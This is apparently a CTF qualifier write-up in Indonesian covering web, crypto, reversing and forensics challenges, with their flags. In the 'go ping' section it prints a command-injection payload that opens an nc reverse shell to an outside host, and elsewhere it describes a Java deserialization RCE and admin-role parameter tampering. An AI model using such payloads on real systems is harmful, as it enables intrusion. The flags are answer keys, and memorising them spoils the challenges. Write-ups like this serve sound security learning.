---
title: Slashroot 8 Quals
date: 2025-03-15
team: N2L - Sigma
member:
  - pajarori
---

# [joy]

## package delivery {#packagedelivery}
### overview
Diberikan file zip berisi file program yang dibuat dengan godot engine terdapat file .exe dan .pck, nah cara mudahnya disini kita hanya perlu melakukan strings pada file .pck dan ambil untuk string berisi kata slashroot, nah karena kayaknya kurang menantang pada saat memulai program disuruh untuk memainkan dan mendapatkan score 9999, disini saya menggunakan cheat engine untuk menyelesaikan itu.
![packagedelivery-1](https://raw.githubusercontent.com/pajarori/ctf/refs/heads/main/2024/slashroot8/images/packagedelivery-1.png)
### flag
slashroot8{N0T90Nn4l1e_tH4T_w45_E45y_hUh?}

# [web exploitation]
## login begin {#loginbegin}
### overview
Pada target website terdapat form login dan register namun terdapat bug parameter tampering pada parameter role di form register sehingga user yang ingin melakukan register bisa menjadikannya ke role admin dan mendapatkan flag yang di sembunyikan pada source htmlnya.
![loginbegin-1](https://raw.githubusercontent.com/pajarori/ctf/refs/heads/main/2024/slashroot8/images/loginbegin-1.png)
![loginbegin-2](https://raw.githubusercontent.com/pajarori/ctf/refs/heads/main/2024/slashroot8/images/loginbegin-2.png)
### flag
slashroot8{W0w_Y0u_G00d_B3gg1nn3r}

## go ping {#goping}
Diberikan sebuah form input host dan ketika di submit aplikasi melakukan execute command ping, ini biasanya sering jadi buat test untuk bug command injection. Disini saya langsung nge rev shell buat dapetin flag make payload
```bash showLineNumbers
&&|$(nc${IFS}10.10.10.10${IFS}1337${IFS}-e${IFS}sh)
```
![goping-1](https://raw.githubusercontent.com/pajarori/ctf/refs/heads/main/2024/slashroot8/images/goping-1.png)
![goping-2](https://raw.githubusercontent.com/pajarori/ctf/refs/heads/main/2024/slashroot8/images/goping-2.png)
### flag
slashroot8{Rc3_W1Th_c0mM4Nd_1Nj3cT1On_1S_V3Ry_v3rY_N1Ce}

## ez momento {#ezmomento}
### overview
Diberikan sebuah file source java, pada challange ini bug nya adalah Deserialization dengan memanfaatkan fungsi toString() di Gadget untuk yang fungsi run() di Command yang akan bisa menjadi RCE. 
![ezmomento-1](https://raw.githubusercontent.com/pajarori/ctf/refs/heads/main/2024/slashroot8/images/ezmomento-1.png)
Pada Main data dari request POST di deserialize dan kemudian memanggil fungsi toString() yang mana ada class Gadget yang mempunyai fungsi toString() yang isinya adalah memanggil fungsi run() dari variable this.command, eksekusi kode dilakukan di dalam class Command dengan menggunakan privat variable. Jadi untuk melakukan exploit dengan membuat payload serialize dari Gadget dan Command dengan variable command di dalam class Command adalah payload untuk reverse shell. 
![ezmomento-2](https://raw.githubusercontent.com/pajarori/ctf/refs/heads/main/2024/slashroot8/images/ezmomento-2.png)
Disini saya menggunakan Main.java untuk membuat payload nya.
![ezmomento-3](https://raw.githubusercontent.com/pajarori/ctf/refs/heads/main/2024/slashroot8/images/ezmomento-3.png)
![ezmomento-4](https://raw.githubusercontent.com/pajarori/ctf/refs/heads/main/2024/slashroot8/images/ezmomento-4.png)
### flag
slashroot8{it_is_really_private_UwU}

# [cryptography]
## baby encrypt {#babyencrypt}
### overview
Diberikan file python yang tampaknya di obfus dan dia sepertinya melakukan aes decrypt dan encrypt, namun ketika saya melihat kodingan ini saya hanya fokus pada bagian `print(eval(_d(_ct, _K, _I)))` dan `from secret import FLAG as _F`. Terdapat eval dan kemudian variable FLAG di *import sebagai _F* disini saya tanpa Slashroot 8.0 | N2L 11 mementingkan segala enkripsi yang terjadi di script ini, saya melakukan brute force untuk mendapatkan variable _F yang hanya 2 byte dan berharap bisa dieksekusi oleh eval() yang kemudian di print().
![babyencrypt-1](https://raw.githubusercontent.com/pajarori/ctf/refs/heads/main/2024/slashroot8/images/babyencrypt-1.png)
### code
[babyencrypt.py](https://raw.githubusercontent.com/pajarori/ctf/refs/heads/main/2024/slashroot8/files/babyencrypt.py)
### flag
slashroot8{ez_aes_decrypt_game_for_first_chall}

# [reverse engineering]

## baby lua {#babylua}
### overview
Diberikan sebuah binary ELF, ketika saya lihat menggunakan ghidra terdapat command yang di enkripsi base64. itu adalah command untuk mendownload file.luac yang nantinya digunakan untuk memverifikasi input user.
![babylua-1](https://raw.githubusercontent.com/pajarori/ctf/refs/heads/main/2024/slashroot8/images/babylua-1.png)
![babylua-2](https://raw.githubusercontent.com/pajarori/ctf/refs/heads/main/2024/slashroot8/images/babylua-2.png)
Jadi di dalam file .luac ini terdapat flag dari challenge, untuk meng decompile luac atau lua compiled menjadi lua saya menggunakan tools [luadec.metaworm.site](https://luadec.metaworm.site/). Setelah di dec terdapat binary text ini tinggal decode aja dan dapatlah flagnya.
![babylua-3](https://raw.githubusercontent.com/pajarori/ctf/refs/heads/main/2024/slashroot8/images/babylua-3.png)
![babylua-4](https://raw.githubusercontent.com/pajarori/ctf/refs/heads/main/2024/slashroot8/images/babylua-4.png)
### flag
slashroot8{ez_0n3_f0r_y0u_see_y0u_1n_f1n4l}

## baby apk {#babyapk}
### overview
Diberikan file .apk yang menerima input angka yang kemudian digunakan untuk mendekripsi file image di raw.
![babyapk-1](https://raw.githubusercontent.com/pajarori/ctf/refs/heads/main/2024/slashroot8/images/babyapk-1.png)
Algoritma yang digunakan dalam melakukan dekripsinya adalah XOR jadi asalkan tau beberapa byte di awal adalah apa maka bisa mendekripsi seluruh image dan kita tahu bahwa awal dari file image adalah header dengan tipe image itu sendiri. Disini headernya gambarnya adalah file png jadi saya menggunakan header png untuk mendapatkan key untuk mendekripsi seluruh isi konten. 
![babyapk-2](https://raw.githubusercontent.com/pajarori/ctf/refs/heads/main/2024/slashroot8/images/babyapk-2.png)
![babyapk-3](https://raw.githubusercontent.com/pajarori/ctf/refs/heads/main/2024/slashroot8/images/babyapk-3.png)
Dan didapatkan gambar qrcode dan ketika di translate dapat lah flagnya.
![babyapk-4](https://raw.githubusercontent.com/pajarori/ctf/refs/heads/main/2024/slashroot8/images/babyapk-4.png)
### flag
slashroot8{t00_d4mn_easy?_see_u_in_f1n4l}

## check khodan {#checkkhodam}
### overview
Terdapat intent FlagActivity pada aplikasi yang akan menampilkan sebuah flag dan untuk bisa melihat isi flag aplikasi melakukan verifikasi apakah level battery pada device yang digunakan adalah 69. 
![checkkhodam-1](https://raw.githubusercontent.com/pajarori/ctf/refs/heads/main/2024/slashroot8/images/checkkhodam-1.png)
Disini saya menggunakan emulator dari Android Studio dan merubah battery level menjadi 69 dan kemudian memanggil intent FlagActivity dan mendapatkan flagnya.
![checkkhodam-2](https://raw.githubusercontent.com/pajarori/ctf/refs/heads/main/2024/slashroot8/images/checkkhodam-2.png)
### flag
slashroot8{my_khod4m_is_j4l4k_b4ali}

# [digital forensic]

## find the key {#findthekey}
### overview
Diberikan file .unknown yang ternyata adalah file gambar jpg yang headernya corrupt jadi harus dibenerin dulu, setelah dibenerin dan di cek menggunakan binwalk terdapat file .zip yang di embed di dalam file .jpg.
![findthekey-1](https://raw.githubusercontent.com/pajarori/ctf/refs/heads/main/2024/slashroot8/images/findthekey-1.png)
tapi file .zip itu terenkripsi namun dapat di brute dan didapatkan passwordnya admin123. 
![findthekey-2](https://raw.githubusercontent.com/pajarori/ctf/refs/heads/main/2024/slashroot8/images/findthekey-2.png)
Setelah di ekstrak terdapat sebuah file yang isinya banyak sekali enkripsi base64 dan binary yang di campur, kebanyakan itu adalah fake flag jadi saya coba satu satu dan ketemu flagnya yang correct.
![findthekey-3](https://raw.githubusercontent.com/pajarori/ctf/refs/heads/main/2024/slashroot8/images/findthekey-3.png)
### flag
slashroot8{Y4n9_b1k1n_s04l_m4s1h_p3mul4}

## tiktiktik {#tiktiktik}
### overview
Diberikan 4 folder yang berisi file .png yang merupakan setiap pixel dari sebuah gambar. Jadi disini harus membentuk ulang gambarnya dari setiap pixel tersebut dan ada 4 folder di sini berarti ada 4 chunk kira kira dan disini saya asumsikan bahwa ini adalah gambar dengan rasio persegi. Disini saya melakukan sorting pada setiap pixel di chunk dan kemudian menggabungkannya semua sehingga nanti terbuatlah 4 file gambar yang jika dirangkai akan menjadi flag.
### code
[tiktiktik.py](https://raw.githubusercontent.com/pajarori/ctf/refs/heads/main/2024/slashroot8/files/tiktiktik.py)
### flag
slashroot8{s33_y0u_d1_f1nAl}
